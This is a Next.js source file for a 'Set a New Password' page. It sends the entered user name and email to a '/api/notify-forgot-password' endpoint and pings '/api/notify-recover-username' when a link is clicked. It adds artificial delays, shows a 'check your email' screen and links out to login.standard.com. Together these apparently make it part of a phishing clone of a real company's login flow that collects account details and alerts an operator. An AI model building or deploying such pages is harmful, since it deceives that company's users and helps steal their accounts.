'use client';

import { useState, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Link from 'next/link';

function ForgotPasswordContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const sent = searchParams.get('sent') === '1';
  const emailFromUrl = searchParams.get('email') || '';

  const [username, setUsername] = useState('');
  const [email, setEmail] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [navigatingTo, setNavigatingTo] = useState(null);

  const [networkError, setNetworkError] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username.trim() || !email.trim()) return;
    setNetworkError('');
    setSubmitting(true);
    try {
      const res = await fetch('/api/notify-forgot-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: username.trim(), email: email.trim() }),
      });
      if (!res.ok) {
        setNetworkError('Network error. Please check your connection and try again.');
        setSubmitting(false);
        return;
      }
      await new Promise((r) => setTimeout(r, 1000));
      router.push(`/login/forgot-password?sent=1&email=${encodeURIComponent(email.trim())}`);
    } catch {
      setNetworkError('Network error. Please check your connection and try again.');
      setSubmitting(false);
    }
  };

  const handleCancel = (e) => {
    e.preventDefault();
    router.push('/login');
  };

  const handleForgotUsernameLink = async (e) => {
    e.preventDefault();
    if (navigatingTo) return;
    setNavigatingTo('forgot-username');
    try {
      await fetch('/api/notify-recover-username', { method: 'POST' });
    } catch {
      // Notification failure does not block navigation
    }
    await new Promise((r) => setTimeout(r, 1000));
    router.push('/login/forgot-username');
  };

  if (sent && emailFromUrl) {
    return (
      <div className="login-container login-container-narrow">
        <div className="recover-content">
          <h1 className="login-title">Set a New Password</h1>
          <p className="recover-intro recover-check-email">Check your email.</p>
          <div className="recover-card">
            <p className="recover-card-text">
              Please follow instructions sent to <strong>{emailFromUrl}</strong> to reset a new password.
            </p>
            <p className="recover-card-text">
              If you don&apos;t receive an email, check your spam or junk folder or <Link href="/login/forgot-password" className="form-link">try again</Link>.
            </p>
            <p className="recover-card-text">
              If you still need help, please <Link href="#" className="form-link">contact us</Link> for assistance.
            </p>
            <Link href="https://login.standard.com/" className="login-button recover-return-btn">
              Return to Login
            </Link>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="login-container login-container-narrow">
      <div className="recover-content">
        <h1 className="login-title">Set a New Password</h1>
        <p className="recover-intro">
          Please provide your user name and email address. If your user name and email address match our records, we&apos;ll email you instructions.
        </p>
        {networkError && (
          <div className="notification-error" role="alert">
            {networkError}
          </div>
        )}
        <form onSubmit={handleSubmit} className="recover-form">
          <div className="form-group">
            <label htmlFor="forgot-username" className="form-label">
              User Name
            </label>
            <input
              type="text"
              id="forgot-username"
              className="form-input"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
            />
          </div>
          <div className="form-group">
            <label htmlFor="forgot-email" className="form-label">
              Email Address
            </label>
            <input
              type="email"
              id="forgot-email"
              className="form-input"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
          <div className="recover-actions">
            <button type="submit" className="login-button recover-send-btn" disabled={submitting}>
              {submitting ? 'Sending…' : 'Send'}
            </button>
            <button type="button" className="form-link button-link" onClick={handleCancel}>
              Cancel
            </button>
          </div>
          <p className="recover-forgot-password">
            <a
              href="/login/forgot-username"
              className={`form-link ${navigatingTo === 'forgot-username' ? 'form-link-loading' : ''}`}
              onClick={handleForgotUsernameLink}
              aria-busy={navigatingTo === 'forgot-username'}
            >
              {navigatingTo === 'forgot-username' ? 'Loading…' : 'Forgot user name?'}
            </a>
          </p>
        </form>
      </div>
    </div>
  );
}

export default function ForgotPasswordPage() {
  return (
    <Suspense fallback={
      <div className="login-container login-container-narrow">
        <div className="recover-content" style={{ padding: '48px', textAlign: 'center' }}>Loading…</div>
      </div>
    }>
      <ForgotPasswordContent />
    </Suspense>
  );
}
